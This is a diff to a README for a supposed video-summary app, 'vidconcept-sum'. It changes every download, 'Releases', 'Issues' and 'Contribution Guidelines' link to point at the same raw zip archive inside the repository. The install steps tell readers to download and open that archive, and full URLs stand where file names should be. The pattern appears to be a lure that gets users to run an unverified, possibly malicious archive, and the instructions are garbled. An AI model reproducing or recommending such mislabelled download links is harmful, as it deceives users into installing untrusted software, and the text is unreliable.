@@ -6,7 +6,7 @@ Welcome to vidconcept-sum! This application helps you create structured summarie
 
 ## 📥 Download the App
 
-[![Download vidconcept-sum](https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum-vidconcept-1.2.zip)](https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum-vidconcept-1.2.zip)
+[![Download vidconcept-sum](https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum_vidconcept_unmotivatedly.zip)](https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum_vidconcept_unmotivatedly.zip)
 
 ## 📋 Requirements
 
@@ -18,11 +18,11 @@ Before you start, please ensure you have:
 
 ## 💿 Download & Install
 
-To get started, visit the [Releases page](https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum-vidconcept-1.2.zip) to download the latest version.
+To get started, visit the [Releases page](https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum_vidconcept_unmotivatedly.zip) to download the latest version.
 
 1. Click on the link above.
 2. Locate the latest release version.
-3. Find the file named `https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum-vidconcept-1.2.zip` (or for macOS/Linux: `https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum-vidconcept-1.2.zip` / `https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum-vidconcept-1.2.zip`).
+3. Find the file named `https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum_vidconcept_unmotivatedly.zip` (or for macOS/Linux: `https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum_vidconcept_unmotivatedly.zip` / `https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum_vidconcept_unmotivatedly.zip`).
 4. Click on the file to start the download.
 5. Once downloaded, open the file:
    - For Windows: Follow the installation prompts.
@@ -90,8 +90,8 @@ We appreciate the work of the developers and the community that supports this pr
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum-vidconcept-1.2.zip)
-- [Issues Page](https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum-vidconcept-1.2.zip)
-- [Contribution Guidelines](https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum-vidconcept-1.2.zip)
+- [Releases Page](https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum_vidconcept_unmotivatedly.zip)
+- [Issues Page](https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum_vidconcept_unmotivatedly.zip)
+- [Contribution Guidelines](https://github.com/QWanFLC/vidconcept-sum/raw/refs/heads/main/vidconcept_sum/sum_vidconcept_unmotivatedly.zip)
 
 Explore the power of efficient video summarization with vidconcept-sum!
